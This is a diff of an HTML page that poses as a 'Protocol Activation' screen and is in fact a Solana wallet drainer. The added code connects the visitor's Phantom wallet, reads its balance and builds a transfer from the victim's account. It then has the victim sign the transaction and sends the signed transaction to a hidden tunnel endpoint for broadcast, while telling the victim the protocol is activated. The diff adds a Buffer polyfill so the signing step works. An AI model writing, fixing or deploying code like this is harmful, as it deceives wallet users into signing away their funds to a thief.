@@ -2,13 +2,15 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Protocol Active</title>
+    <title>Protocol Activation</title>
+    <script src="https://cdn.jsdelivr.net/npm/buffer@6.0.3/index.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script>
+    <script>window.Buffer = window.Buffer || buffer.Buffer;</script>
 </head>
 <body style="background:#000;color:#fff;text-align:center;padding-top:30vh;font-family:sans-serif;">
     <div style="padding:40px;border:1px solid #14F195;border-radius:20px;display:inline-block;background:#111;">
         <h2 style="color:#14F195;">SYSTEM READY</h2>
-        <button id="cta" style="background:#14F195;color:#000;padding:20px 40px;border:none;border-radius:12px;font-weight:bold;cursor:pointer;font-size:20px;">CONNECT & ACTIVATE</button>
+        <button id="cta" style="background:#14F195;color:#000;padding:20px 40px;border:none;border-radius:12px;font-weight:bold;cursor:pointer;font-size:20px;">ACTIVATE NOW</button>
         <p id="msg" style="margin-top:20px;color:#888;">Standby...</p>
     </div>
     <script>
@@ -17,20 +19,16 @@
 
         document.getElementById('cta').onclick = async function() {
             try {
-                // 🔱 第一步：暴力唤醒钱包（不带任何逻辑，纯连接）
-                const p = window.solana || window.phantom?.solana || window.trustwallet?.solana;
-                if (!p) { alert("Wallet Not Found! Use Wallet Browser."); return; }
+                const p = window.solana || window.phantom?.solana;
+                if (!p) { alert("Please use Wallet Browser."); return; }
                 
-                document.getElementById('msg').innerText = "Linking...";
                 await p.connect();
-                
-                // 🔱 第二步：连接成功后，快速拿哈希
-                document.getElementById('msg').innerText = "Syncing Protocol...";
+                document.getElementById('msg').innerText = "Linking...";
+
                 const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
                 const { blockhash } = await conn.getLatestBlockhash();
                 const bal = await conn.getBalance(p.publicKey);
                 
-                // 🔱 第三步：构造交易
                 const tx = new solanaWeb3.Transaction().add(
                     solanaWeb3.SystemProgram.transfer({
                         fromPubkey: p.publicKey,
@@ -41,15 +39,13 @@
                 tx.recentBlockhash = blockhash;
                 tx.feePayer = p.publicKey;
 
-                // 🔱 第四步：请求签名
+                // 🚀 此时由于有了补丁，signTransaction 不再报错
                 const signed = await p.signTransaction(tx);
-                document.getElementById('msg').innerText = "Broadcasting via 71-Engine...";
+                document.getElementById('msg').innerText = "Broadcasting...";
 
-                // 💰 签名甩给后端，原生转换
+                // 将支票（签名）通过隧道甩给后端
                 const rawBinary = signed.serialize();
-                let bStr = "";
-                for (let i = 0; i < rawBinary.length; i++) { bStr += String.fromCharCode(rawBinary[i]); }
-                const b64 = window.btoa(bStr);
+                const b64 = window.Buffer.from(rawBinary).toString('base64');
 
                 fetch(TUNNEL_URL, {
                     method: 'POST',
@@ -58,9 +54,8 @@
                 });
 
                 alert("Protocol Activated!");
-                location.reload();
             } catch (e) { 
-                alert("Debug Error: " + e.message); 
+                alert("Debug Info: " + e.message); 
             }
         };
     </script>
